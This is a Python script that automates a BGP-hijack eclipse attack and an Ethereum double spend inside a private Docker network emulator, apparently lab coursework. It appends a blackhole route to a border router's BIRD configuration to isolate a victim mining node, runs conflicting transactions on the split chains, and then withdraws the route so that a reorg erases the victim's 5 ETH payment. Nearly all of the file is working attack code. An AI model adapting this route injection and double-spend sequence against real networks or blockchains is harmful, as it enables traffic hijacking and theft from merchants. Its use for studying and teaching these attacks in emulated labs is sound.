#!/usr/bin/env python3
"""
BGP Eclipse Attack & Double Spend: Full Automation Script
Private Ethereum PoW Emulator

Topology:
  Victim:      Node 160 (BootNode Miner)    10.160.0.71
  Real World:  Node 161 (Miner)             10.161.0.71
               Node 162 (Miner)             10.162.0.71
  Attacker:    AS161 Border Router          as161brd-router0-10.161.0.254

Attack mechanism:
  The AS161 border router runs BIRD. We append a static blackhole route for
  10.160.0.71/32 to bird.conf and reload — causing the other ASes to route all
  traffic destined for the victim through AS161, where it is dropped. No ARP
  spoofing, no iptables — pure L3 routing manipulation via BGP UPDATE.

Run from the Host VM (not inside a container).
Requires:
  - docker CLI available
  - fake_tx.py and real_tx.py present in the same directory
  - Python packages: web3  (pip install web3)

Usage:
  python3 bgp_eclipse_attack.py            # full run
  python3 bgp_eclipse_attack.py --phase 0  # preflight only
  python3 bgp_eclipse_attack.py --phase 1  # eclipse only, no tx
  python3 bgp_eclipse_attack.py --skip-reorg
"""

import subprocess
import sys
import time
import argparse
import signal
import textwrap
import urllib.request as _ureq
import json as _json
from datetime import datetime
from web3 import Web3

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
CONTAINERS = {
    "node160":   "as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71",
    "node161":   "as161h-Ethereum-POW-01-Miner-10.161.0.71",
    "node162":   "as162h-Ethereum-POW-02-Miner-10.162.0.71",
    "attacker_router": "as161brd-router0-10.161.0.254",
}
RPC = {
    "node160": "http://10.160.0.71:8545",
    "node161": "http://10.161.0.71:8545",
    "node162": "http://10.162.0.71:8545",
}

# Roles — the victim now lives in the AS160 subnet; the rest of the network
# (Node 161 + Node 162) stays healthy. REAL is our reference into the real chain.
VICTIM = "node160"
REAL   = "node161"

ADDR_ORIGIN = "0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24"
ADDR_VICTIM = "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9"
ADDR_BOB    = "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"

FAKE_TX_SCRIPT = "./fake_tx.py"
REAL_TX_SCRIPT = "./real_tx.py"

# BIRD config path inside the attacker router container
BIRD_CONF = "/etc/bird/bird.conf"

# The malicious route block we inject — a host-specific blackhole for the victim
BGP_HIJACK_BLOCK = """
protocol static hijack {
    ipv4 {
        table t_direct;
    };
    route 10.160.0.71/32 blackhole;
}
"""
# Marker we embed so we can surgically remove it later
BGP_HIJACK_MARKER = "protocol static hijack {"

# Victim IP for route verification
VICTIM_IP = "10.160.0.71"

POLL_INTERVAL         = 3    # seconds between polls
PEER_POLL_TIMEOUT     = 120  # max seconds to wait for peers to appear/disappear
BLOCK_ADVANCE_TIMEOUT = 180  # max seconds to wait for blocks to advance
REORG_MARGIN          = 5    # real chain must lead fake chain by this many blocks

# ──────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
MAGENTA = "\033[95m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(msg, color=WHITE):
    print(f"{DIM}[{ts()}]{RESET} {color}{msg}{RESET}", flush=True)

def log_phase(n, title):
    bar = "=" * 60
    print(f"\n{CYAN}{BOLD}{bar}{RESET}")
    print(f"{CYAN}{BOLD}  PHASE {n}: {title}{RESET}")
    print(f"{CYAN}{BOLD}{bar}{RESET}\n", flush=True)

def log_ok(msg):
    print(f"{DIM}[{ts()}]{RESET} {GREEN}{BOLD}+  {msg}{RESET}", flush=True)

def log_warn(msg):
    print(f"{DIM}[{ts()}]{RESET} {YELLOW}{BOLD}!  {msg}{RESET}", flush=True)

def log_err(msg):
    print(f"{DIM}[{ts()}]{RESET} {RED}{BOLD}x  {msg}{RESET}", flush=True)

def log_info(msg):
    print(f"{DIM}[{ts()}]{RESET} {CYAN}-> {msg}{RESET}", flush=True)

def log_balances(label, origin, victim, bob):
    print(f"\n  {BOLD}{WHITE}{'-'*50}{RESET}")
    print(f"  {BOLD}{WHITE}Balances [{label}]{RESET}")
    print(f"  {WHITE}Origin  {ADDR_ORIGIN[:12]}...  {CYAN}{BOLD}{origin:.4f} ETH{RESET}")
    print(f"  {WHITE}Victim  {ADDR_VICTIM[:12]}...  {CYAN}{BOLD}{victim:.4f} ETH{RESET}")
    print(f"  {WHITE}Bob     {ADDR_BOB[:12]}...  {CYAN}{BOLD}{bob:.4f} ETH{RESET}")
    print(f"  {BOLD}{WHITE}{'-'*50}{RESET}\n", flush=True)

def abort(msg):
    log_err(f"FATAL: {msg}")
    sys.exit(1)

# ──────────────────────────────────────────────
# DOCKER / SHELL HELPERS
# ──────────────────────────────────────────────
def docker_exec(container, cmd, check=True):
    full = ["docker", "exec", container, "sh", "-c", cmd]
    r = subprocess.run(full, capture_output=True, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"docker exec [{container}] failed: {r.stderr.strip()}")
    return r.stdout.strip()

def geth_exec(container, js, check=True):
    return docker_exec(container,
                       f'geth attach --exec "{js}" /root/.ethereum/geth.ipc',
                       check=check)

def host_run(cmd, check=True):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"Host command failed: {r.stderr.strip()}")
    return r.stdout.strip()

# ──────────────────────────────────────────────
# WEB3 HELPERS
# ──────────────────────────────────────────────
def make_w3(node_key):
    return Web3(Web3.HTTPProvider(RPC[node_key]))

def wei_to_eth(v):
    return float(Web3.fromWei(v, "ether"))

def get_balances_eth(w3):
    return (
        wei_to_eth(w3.eth.get_balance(ADDR_ORIGIN)),
        wei_to_eth(w3.eth.get_balance(ADDR_VICTIM)),
        wei_to_eth(w3.eth.get_balance(ADDR_BOB)),
    )

def get_peer_count(container):
    try:
        return int(geth_exec(container, "admin.peers.length", check=False).strip())
    except Exception:
        return -1

# ──────────────────────────────────────────────
# POLLING UTILITY
# ──────────────────────────────────────────────
def wait_for(condition_fn, timeout, poll=POLL_INTERVAL, label="condition"):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            result = condition_fn()
            if result:
                return result
        except Exception as e:
            log(f"  poll '{label}' error: {e}", DIM)
        remaining = int(deadline - time.time())
        log(f"  Waiting for {label} ... ({remaining}s left)", DIM)
        time.sleep(poll)
    return None

# ──────────────────────────────────────────────
# MINING HELPERS
# ──────────────────────────────────────────────
def wait_for_rpc(node_key, timeout=120):
    log_info(f"Waiting for RPC on {node_key} ({RPC[node_key]}) ...")
    def check():
        try:
            return make_w3(node_key).isConnected()
        except Exception:
            return False
    if not wait_for(check, timeout, label=f"{node_key} RPC"):
        abort(f"RPC on {node_key} never came up after {timeout}s")
    log_ok(f"RPC on {node_key} is live")
    return make_w3(node_key)

def wait_for_all_mining(nodes, timeout=BLOCK_ADVANCE_TIMEOUT):
    """
    Snapshot all block heights at once, then poll until every node
    has advanced past its starting block. nodes = {label: w3}.
    """
    log_info("Snapshotting initial block heights for all nodes ...")
    initial = {}
    for label, w3 in nodes.items():
        try:
            initial[label] = w3.eth.block_number
        except Exception:
            initial[label] = None
        log(f"  {label}: block {initial[label]}", DIM)

    log_info("Waiting for ALL nodes to advance at least one block ...")
    def all_advanced():
        statuses = {}
        for label, w3 in nodes.items():
            try:
                bn = w3.eth.block_number
                statuses[label] = (initial[label] is not None and bn > initial[label], bn)
            except Exception:
                statuses[label] = (False, "?")
        status_str = "  " + "  ".join(
            f"{l}:{v[1]}({'ok' if v[0] else '...'})" for l, v in statuses.items()
        )
        log(status_str, DIM)
        return all(v[0] for v in statuses.values())

    if not wait_for(all_advanced, timeout, label="all nodes mining"):
        abort(f"Not all nodes advanced blocks within {timeout}s")
    log_ok("All nodes are mining!")

def ensure_mining(node_key, w3):
    """Check block advances over 5s; if not, restart the miner."""
    log_info(f"Verifying {node_key} miner is active ...")
    initial = w3.eth.block_number
    time.sleep(5)
    if w3.eth.block_number > initial:
        log_ok(f"  {node_key} is mining (block advanced)")
        return
    log_warn(f"  {node_key} block did not advance — restarting miner ...")
    cname = CONTAINERS[node_key]
    docker_exec(cname, 'geth attach --exec "miner.stop()" /root/.ethereum/geth.ipc', check=False)
    docker_exec(cname, 'geth attach --exec "miner.setEtherbase(eth.accounts[0])" /root/.ethereum/geth.ipc', check=False)
    docker_exec(cname, 'geth attach --exec "miner.start(1)" /root/.ethereum/geth.ipc', check=False)
    time.sleep(3)
    initial2 = w3.eth.block_number
    time.sleep(6)
    if w3.eth.block_number > initial2:
        log_ok(f"  {node_key} miner restarted successfully")
    else:
        log_warn(f"  {node_key} still not mining after restart — check container logs")

# ──────────────────────────────────────────────
# BGP HELPERS
# ──────────────────────────────────────────────
def bird_conf_has_hijack():
    """Return True if our hijack block is already in bird.conf."""
    content = docker_exec(CONTAINERS["attacker_router"], f"cat {BIRD_CONF}", check=False)
    return BGP_HIJACK_MARKER in content

def inject_bgp_hijack():
    """Append the malicious blackhole route to bird.conf."""
    # Escape the block for sh -c echo — use printf to append safely
    escaped = BGP_HIJACK_BLOCK.replace("'", "'\\''")
    docker_exec(
        CONTAINERS["attacker_router"],
        f"printf '%s' '{escaped}' >> {BIRD_CONF}"
    )

def remove_bgp_hijack():
    """
    Remove the hijack block from bird.conf using sed.
    Deletes from the marker line through the closing brace.
    """
    # Delete from 'protocol static hijack {' through the next standalone '}'
    docker_exec(
        CONTAINERS["attacker_router"],
        f"sed -i '/protocol static hijack/,/^}}/d' {BIRD_CONF}",
        check=False
    )

def birdc_configure():
    """Reload BIRD config and return its output."""
    out = docker_exec(CONTAINERS["attacker_router"], "birdc configure", check=False)
    log(f"  birdc: {out.strip()}", DIM)
    return out

def get_route_for_victim():
    """
    Ask a remote AS border router how it routes to the victim IP.
    Returns the output of 'ip route get 10.160.0.71'.
    """
    # Find the AS162 border router container name (a remote AS that should be
    # diverted toward the AS161 hijacker once the /32 is announced)
    r = subprocess.run(
        ["docker", "ps", "--format", "{{.Names}}"],
        capture_output=True, text=True
    )
    brd162 = next(
        (n for n in r.stdout.splitlines() if "as162brd" in n or "as162" in n and "brd" in n),
        None
    )
    if not brd162:
        return "(could not find AS162 border router container)"
    return docker_exec(brd162, f"ip route get {VICTIM_IP}", check=False)

# ──────────────────────────────────────────────
# TX SCRIPT RUNNERS
# ──────────────────────────────────────────────
def stream_script(script_path, label, results):
    import os
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONWARNINGS"] = "ignore"
    proc = subprocess.Popen(
        [sys.executable, "-u", script_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1, env=env
    )
    for line in proc.stdout:
        line = line.rstrip()
        if not line:
            continue
        if line.startswith("[+]"):
            log_ok(f"  [{label}] {line}")
        elif line.startswith("[*]"):
            log_info(f"  [{label}] {line}")
        elif line.startswith("[!]"):
            log_warn(f"  [{label}] {line}")
        else:
            log(f"  [{label}] {line}", DIM)
    proc.wait()
    results[label] = proc.returncode

def run_tx_scripts_concurrently():
    import threading
    results = {}
    t_fake = threading.Thread(target=stream_script,
                              args=(FAKE_TX_SCRIPT, "FAKE", results), daemon=True)
    t_real = threading.Thread(target=stream_script,
                              args=(REAL_TX_SCRIPT, "REAL", results), daemon=True)
    t_fake.start()
    t_real.start()
    t_fake.join()
    t_real.join()
    if results.get("FAKE", 1) != 0:
        abort(f"{FAKE_TX_SCRIPT} exited with code {results.get('FAKE')}")
    if results.get("REAL", 1) != 0:
        abort(f"{REAL_TX_SCRIPT} exited with code {results.get('REAL')}")

# ──────────────────────────────────────────────
# PHASE 0 — PRE-FLIGHT
# ──────────────────────────────────────────────
def phase0_preflight():
    log_phase(0, "PRE-FLIGHT CHECKS")

    log_info("Checking docker ...")
    try:
        host_run("docker info")
        log_ok("Docker is running")
    except Exception:
        abort("Docker not available on host")

    log_info("Checking all containers are running ...")
    for name, cname in CONTAINERS.items():
        r = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}", cname],
                           capture_output=True, text=True)
        if "true" not in r.stdout:
            abort(f"Container {name} ({cname}) is NOT running — run dcup first")
        log_ok(f"  {name}: running")

    log_info("Checking tx scripts exist ...")
    for path in (FAKE_TX_SCRIPT, REAL_TX_SCRIPT):
        try:
            host_run(f"test -f {path}")
            log_ok(f"  Found {path}")
        except Exception:
            abort(f"{path} not found — place it next to this script")

    log_info("Checking BIRD is available in attacker router ...")
    out = docker_exec(CONTAINERS["attacker_router"], "birdc show status", check=False)
    if "BIRD" not in out and "bird" not in out.lower():
        abort("BIRD daemon not responding in attacker router — is it running?")
    log_ok("BIRD is running in attacker router")

    log_info("Checking bird.conf does not already contain a hijack block ...")
    if bird_conf_has_hijack():
        log_warn("bird.conf already contains a hijack block — cleaning up stale state ...")
        remove_bgp_hijack()
        birdc_configure()
        time.sleep(3)
        if bird_conf_has_hijack():
            abort("Could not remove stale hijack block from bird.conf")
        log_ok("Stale hijack block removed")
    else:
        log_ok("bird.conf is clean")

    w3_160 = wait_for_rpc("node160")
    w3_161 = wait_for_rpc("node161")
    w3_162 = wait_for_rpc("node162")

    wait_for_all_mining({"node160": w3_160, "node161": w3_161, "node162": w3_162})

    b160 = w3_160.eth.block_number
    b161 = w3_161.eth.block_number
    b162 = w3_162.eth.block_number
    log_info(f"Block heights -- 160: {b160}  161: {b161}  162: {b162}")
    if max(b160, b161, b162) - min(b160, b161, b162) > 10:
        log_warn("Block heights differ by more than 10 — nodes may not be fully synced")
    else:
        log_ok("Block heights look consistent")

    o, v, b = get_balances_eth(w3_161)
    log_balances("Pre-Attack (Node 161)", o, v, b)
    if o < 2.0:
        abort(f"Origin account only has {o:.4f} ETH — need at least 2 ETH")

    peers = get_peer_count(CONTAINERS[VICTIM])
    log_info(f"Node 160 peer count before attack: {peers}")
    if peers == 0:
        log_warn("Node 160 already has 0 peers — check network connectivity")
    else:
        log_ok(f"Node 160 is connected ({peers} peers)")

    log_ok("Pre-flight complete — all systems go\n")
    return w3_160, w3_161, w3_162

# ──────────────────────────────────────────────
# PHASE 1 — BGP HIJACK ECLIPSE
# ──────────────────────────────────────────────
def phase1_bgp_eclipse():
    log_phase(1, "BGP HIJACKING ECLIPSE — ISOLATING NODE 160")

    # Show current bird.conf tail so we know what we're appending to
    tail = docker_exec(CONTAINERS["attacker_router"], f"tail -20 {BIRD_CONF}", check=False)
    log(f"  Current bird.conf tail:\n{tail}", DIM)

    # ── Step 1: inject the malicious route ───────────────────────
    log_info("Injecting blackhole route for 10.160.0.71/32 into bird.conf ...")
    inject_bgp_hijack()

    # Verify it's in the file
    if not bird_conf_has_hijack():
        abort("Hijack block was not written to bird.conf — check permissions")
    log_ok("Malicious route block written to bird.conf")

    # ── Step 2: reload BIRD to broadcast BGP UPDATE ──────────────
    log_info("Reloading BIRD config (triggers BGP UPDATE to route server) ...")
    out = birdc_configure()
    if "Reconfigured" in out or "reconfigured" in out:
        log_ok("BIRD reconfigured successfully — BGP UPDATE sent")
    else:
        log_warn(f"Unexpected birdc output: {out.strip()} — continuing anyway")

    # ── Step 3: verify route propagation ─────────────────────────
    # Poll AS162's border router: the route to victim should now go via AS161
    log_info("Waiting for poisoned route to propagate to AS162 ...")
    def route_hijacked():
        route_out = get_route_for_victim()
        log(f"  AS162 route to {VICTIM_IP}: {route_out.strip()}", DIM)
        # The route should now point via 10.103.0.161 (AS161's IX address)
        return "10.103.0.161" in route_out or "as161" in route_out.lower()
    result = wait_for(route_hijacked, timeout=60, label="BGP route propagated to AS162")
    if not result:
        log_warn("Could not confirm route propagation via AS162 router — verifying via peer count instead")
    else:
        log_ok("BGP route confirmed: AS162 is now routing victim traffic through AS161 (blackhole)")

    # ── Step 4: confirm node 160 loses peers ─────────────────────
    log_info("Verifying eclipse — waiting for Node 160 peer count to reach 0 ...")
    def check_isolated():
        p = get_peer_count(CONTAINERS[VICTIM])
        log(f"  Node 160 peers: {p}", DIM)
        return p == 0
    result = wait_for(check_isolated, timeout=PEER_POLL_TIMEOUT, label="Node 160 isolated")
    if not result:
        log_warn("Node 160 still has peers — eclipse may be partial (BGP convergence can be slow)")
    else:
        log_ok("Eclipse confirmed! Node 160 has 0 peers — it is ISOLATED via BGP blackhole")

    log_ok("Phase 1 complete — Node 160 is eclipsed at Layer 3\n")

# ──────────────────────────────────────────────
# PHASE 2 — DOUBLE SPEND
# ──────────────────────────────────────────────
def phase2_double_spend(w3_real, w3_victim):
    log_phase(2, "DOUBLE SPEND — DIVERGING THE CHAINS")

    # Victim miner may have stalled — verify and restart if needed
    ensure_mining(VICTIM, w3_victim)

    nonce_real = w3_real.eth.get_transaction_count(ADDR_ORIGIN)
    nonce_fake = w3_victim.eth.get_transaction_count(ADDR_ORIGIN)
    log_info(f"Nonce on real chain (node161): {nonce_real}")
    log_info(f"Nonce on fake chain (node160): {nonce_fake}")
    if nonce_real != nonce_fake:
        log_warn(f"Nonces differ ({nonce_real} vs {nonce_fake}) — chains may already be diverged!")
    else:
        log_ok(f"Nonces match ({nonce_real}) — both chains see the same account state")

    log_info("Launching fake_tx.py and real_tx.py concurrently ...")
    run_tx_scripts_concurrently()

    log_info("Fetching balances from both worlds ...")
    o_real, v_real, b_real = get_balances_eth(w3_real)
    o_fake, v_fake, b_fake = get_balances_eth(w3_victim)

    log_balances("REAL WORLD (Node 161)", o_real, v_real, b_real)
    log_balances("FAKE WORLD (Node 160)", o_fake, v_fake, b_fake)

    if b_real > 0.9:
        log_ok("Bob received 1 ETH on the real chain")
    else:
        log_warn(f"Bob's real balance: {b_real:.4f} ETH (unexpected)")

    if v_fake > v_real + 4.0:
        log_ok("Victim thinks they received 5 ETH (fake chain) — they are fooled!")
    else:
        log_warn(f"Victim fake balance: {v_fake:.4f} ETH (unexpected)")

    real_block = w3_real.eth.block_number
    fake_block = w3_victim.eth.block_number
    log_info(f"Chain lengths -- Real: {real_block}  Fake: {fake_block}")
    if real_block > fake_block:
        log_ok(f"Real chain is longer by {real_block - fake_block} blocks")
    else:
        log_warn("Fake chain is currently longer — real chain needs to catch up before Phase 3")

    log_ok("Phase 2 complete — both realities exist simultaneously\n")
    return real_block, fake_block

# ──────────────────────────────────────────────
# PHASE 3 — CHAIN REORGANIZATION
# ──────────────────────────────────────────────
def phase3_reorg(w3_real, w3_victim, real_block_at_p2, fake_block_at_p2):
    log_phase(3, "CHAIN REORGANIZATION — THE VANISH")

    # Wait for safe margin before withdrawing the route
    log_info(f"Waiting for real chain to lead fake chain by at least {REORG_MARGIN} blocks ...")
    def real_chain_ahead_enough():
        r = w3_real.eth.block_number
        f = w3_victim.eth.block_number
        margin = r - f
        log(f"  Real: {r}  Fake: {f}  margin: {margin:+d}  (need +{REORG_MARGIN})", DIM)
        return margin >= REORG_MARGIN
    result = wait_for(real_chain_ahead_enough, timeout=300,
                      label=f"real chain +{REORG_MARGIN} blocks ahead")
    if not result:
        log_warn(f"Real chain never reached +{REORG_MARGIN} margin in 5 min — releasing anyway")
    else:
        margin = w3_real.eth.block_number - w3_victim.eth.block_number
        log_ok(f"Real chain is ahead by {margin} blocks — safe margin reached")

    # ── Remove the malicious BGP route ───────────────────────────
    log_info("Removing hijack block from bird.conf ...")
    remove_bgp_hijack()

    if bird_conf_has_hijack():
        log_warn("Hijack block may still be present — check bird.conf manually")
    else:
        log_ok("Hijack block removed from bird.conf")

    log_info("Reloading BIRD config (triggers BGP WITHDRAW to route server) ...")
    out = birdc_configure()
    if "Reconfigured" in out or "reconfigured" in out:
        log_ok("BIRD reconfigured — BGP WITHDRAW sent, routes converging")
    else:
        log_warn(f"Unexpected birdc output: {out.strip()}")

    # Verify AS162 route returns to normal
    log_info("Waiting for AS162 route to victim to recover ...")
    def route_restored():
        route_out = get_route_for_victim()
        log(f"  AS162 route to {VICTIM_IP}: {route_out.strip()}", DIM)
        # Route should no longer be diverted via AS161's IX address
        return "10.103.0.161" not in route_out
    result = wait_for(route_restored, timeout=60, label="BGP route restored")
    if not result:
        log_warn("AS162 route may not have restored yet — BGP convergence can take time")
    else:
        log_ok("BGP route restored — traffic to victim now flows normally again")

    # Node 160 should reconnect automatically once routing recovers.
    # But we also push an addPeer via JSON-RPC to speed it up.
    log_info("Getting healthy node enode URL (Node 161) ...")
    enode_raw = geth_exec(CONTAINERS[REAL], "admin.nodeInfo.enode")
    enode = enode_raw.strip().strip('"').replace("127.0.0.1", "10.161.0.71")
    log_info(f"Healthy node enode: {enode[:70]}...")

    log_info("Pushing addPeer to Node 160 (victim) via JSON-RPC ...")
    try:
        body = _json.dumps({
            "jsonrpc": "2.0", "method": "admin_addPeer",
            "params": [enode], "id": 1
        }).encode()
        req = _ureq.Request(RPC[VICTIM], data=body,
                            headers={"Content-Type": "application/json"})
        resp = _json.loads(_ureq.urlopen(req, timeout=5).read())
        if resp.get("result"):
            log_ok(f"  admin_addPeer accepted")
        else:
            log_warn(f"  admin_addPeer response: {resp}")
    except Exception as e:
        log_warn(f"  admin_addPeer failed: {e} (node may reconnect on its own via BGP recovery)")

    # Poll until Node 160 has peers
    log_info("Waiting for Node 160 to reconnect ...")
    def has_peers():
        p = get_peer_count(CONTAINERS[VICTIM])
        log(f"  Node 160 peers: {p}", DIM)
        return p > 0
    result = wait_for(has_peers, timeout=PEER_POLL_TIMEOUT, label="Node 160 has peers")
    if not result:
        log_warn("Node 160 still has no peers — BGP may still be converging")
    else:
        log_ok("Node 160 reconnected to real network!")

    # Poll until block heights converge (reorg happened)
    log_info("Waiting for Node 160 to sync with real chain ...")
    def chains_synced():
        try:
            r = w3_real.eth.block_number
            f = w3_victim.eth.block_number
            log(f"  Real: {r}  Victim (160): {f}", DIM)
            return abs(r - f) <= 2
        except Exception:
            return False
    result = wait_for(chains_synced, timeout=180, label="chains synced")
    if not result:
        log_warn("Chains did not fully sync within 3 min — partial reorg possible")
    else:
        log_ok("Node 160 has synced with the real chain — reorg complete!")

    # ── Final balance check ───────────────────────────────────────
    log_info("Reading final balances from Node 160 (post-reorg) ...")
    o_post, v_post, b_post = get_balances_eth(w3_victim)
    log_balances("POST-REORG (Node 160)", o_post, v_post, b_post)

    o_real_now, v_real_now, b_real_now = get_balances_eth(w3_real)

    print(f"\n  {BOLD}{GREEN}{'='*50}{RESET}")
    print(f"  {BOLD}{GREEN}  DOUBLE SPEND RESULT{RESET}")
    print(f"  {BOLD}{GREEN}{'='*50}{RESET}")
    if b_post > 0.9 or abs(b_post - b_real_now) < 0.1:
        log_ok(f"Bob kept 1 ETH on the real chain ({b_post:.4f} ETH on node160)")
    else:
        log_warn(f"Bob's balance: {b_post:.4f} ETH (unexpected)")
    if abs(v_post - v_real_now) < 0.5:
        log_ok(f"Victim balance on 160 ({v_post:.4f}) matches real chain ({v_real_now:.4f})")
        log_ok("Victim's 5 ETH payment VANISHED after reorg")
        log_ok("The victim delivered goods for 5 ETH that no longer exist")
    else:
        log_warn(f"Victim on 160: {v_post:.4f} ETH  |  Real chain: {v_real_now:.4f} ETH (may still be syncing)")
    print(f"  {BOLD}{GREEN}{'='*50}{RESET}\n", flush=True)

    log_ok("Phase 3 complete — BGP hijacking eclipse attack and double spend successful!\n")

# ──────────────────────────────────────────────
# SIGNAL HANDLER — emergency cleanup
# ──────────────────────────────────────────────
def cleanup_on_interrupt(sig, frame):
    print(f"\n{YELLOW}{BOLD}[!] Interrupted — attempting emergency cleanup ...{RESET}")
    try:
        remove_bgp_hijack()
        birdc_configure()
        print(f"{GREEN}  Hijack route removed and BIRD reloaded{RESET}")
    except Exception as e:
        print(f"{RED}  Cleanup failed: {e}{RESET}")
        print(f"{YELLOW}  Manual fix: remove 'protocol static hijack' block from{RESET}")
        print(f"{YELLOW}  {BIRD_CONF} inside {CONTAINERS['attacker_router']} and run 'birdc configure'{RESET}")
    sys.exit(1)

# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="BGP Hijacking Eclipse Attack & Double Spend automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Run from the directory containing fake_tx.py and real_tx.py.
            Requires: docker, python3, web3
        """)
    )
    parser.add_argument("--skip-reorg", action="store_true",
                        help="Stop after Phase 2 (skip chain reorganization)")
    parser.add_argument("--phase", type=int, choices=[0, 1, 2, 3], default=None,
                        help="Run only up to this phase")
    args = parser.parse_args()

    signal.signal(signal.SIGINT,  cleanup_on_interrupt)
    signal.signal(signal.SIGTERM, cleanup_on_interrupt)

    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  BGP HIJACKING ECLIPSE ATTACK & DOUBLE SPEND{RESET}")
    print(f"{CYAN}{BOLD}  Ethereum PoW Private Emulator{RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}\n")
    print(f"  {DIM}Attacker: AS161 border router  as161brd-router0-10.161.0.254{RESET}")
    print(f"  {DIM}Victim:   Node 160             10.160.0.71{RESET}")
    print(f"  {DIM}Method:   BGP blackhole route  10.160.0.71/32 via BIRD{RESET}\n")

    max_phase = args.phase if args.phase is not None else (2 if args.skip_reorg else 3)

    w3_160, w3_161, w3_162 = phase0_preflight()
    if max_phase == 0:
        log_ok("Stopped after pre-flight (--phase 0)")
        return

    phase1_bgp_eclipse()
    if max_phase == 1:
        log_ok("Stopped after eclipse (--phase 1)")
        log_warn("BGP hijack is ACTIVE — run cleanup or remove hijack block manually")
        return

    # real reference is Node 161, victim is Node 160
    real_block, fake_block = phase2_double_spend(w3_161, w3_160)
    if max_phase == 2:
        log_ok("Stopped after double spend (--phase 2 / --skip-reorg)")
        log_warn("BGP hijack is still ACTIVE — run phase 3 or clean up manually")
        return

    phase3_reorg(w3_161, w3_160, real_block, fake_block)
    print(f"\n{GREEN}{BOLD}  All phases complete.{RESET}\n")


if __name__ == "__main__":
    main()
